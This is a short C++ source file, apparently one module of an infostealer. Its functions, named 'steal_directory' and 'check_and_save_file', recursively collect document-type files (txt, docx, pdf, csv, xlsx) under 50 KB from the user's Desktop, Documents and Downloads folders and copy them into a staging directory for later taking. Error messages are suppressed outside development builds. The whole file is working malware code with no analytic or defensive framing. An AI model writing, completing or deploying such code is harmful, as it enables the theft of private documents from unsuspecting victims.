//
// Created by .1qxz on 07.06.2024.
//

#include "Files.h"

static const std::vector<std::string> ALLOWED_EXTENSIONS = {"txt", "docx", "pdf", "csv", "xlsx"};
static const std::uintmax_t MAX_FILESIZE = 1000 * 50; // 50kb

void Files::execute(fs::path &root) {
    fs::path filesPath = root / "Files";

    Files::steal_directory(Utils::getUserHome() / "Desktop", filesPath / "Desktop");
    Files::steal_directory(Utils::getUserHome() / "Documents", filesPath / "Documents");
    Files::steal_directory(Utils::getUserHome() / "Downloads", filesPath / "Downloads");
}

void Files::steal_directory(const fs::path &path, const fs::path &out) {
    try {
        for (const auto& entry : fs::recursive_directory_iterator(path)) {
            if (fs::is_regular_file(entry.path())) {
                check_and_save_file(entry.path(), entry.path().lexically_relative(path), out);
            }
        }
    }
    catch (fs::filesystem_error& e) {
        #if DEV
            std::cerr << "Filesystem error: " << e.what() << std::endl;
        #endif
    }
}

void Files::check_and_save_file(const fs::path &path, const fs::path &rel_path, const fs::path &out) {
    if(!fs::is_regular_file(path))
        return;

    std::string extension = path.extension().string();
    extension.erase(0, 1);

    if (std::find(ALLOWED_EXTENSIONS.begin(), ALLOWED_EXTENSIONS.end(), extension) == ALLOWED_EXTENSIONS.end()) {
        return;
    }

    if (fs::file_size(path) > MAX_FILESIZE) {
        return;
    }

    fs::create_directories(out / rel_path.parent_path());
    fs::copy_file(path, out / rel_path, fs::copy_options::overwrite_existing);
}
